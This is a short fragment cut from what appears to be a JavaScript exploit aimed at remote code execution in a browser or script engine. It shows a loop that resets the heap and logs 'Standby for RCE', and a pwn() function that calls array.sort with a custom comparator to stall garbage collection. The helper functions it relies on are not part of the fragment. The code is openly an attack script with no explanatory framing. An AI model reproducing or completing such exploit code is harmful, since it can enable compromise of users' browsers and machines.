			log("Standby for RCE :)");
			throw "pwn :]";
		} else {
			//heap state is rly fucked up
			reset_heap(0x5000);
			continue;
		}
		if (padding.length == limit) break;
	}
	return 0;
}

function pwn() {
	var array = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5];
	array.sort(fakesort); //pause the garbage collector
}

pwn();
```
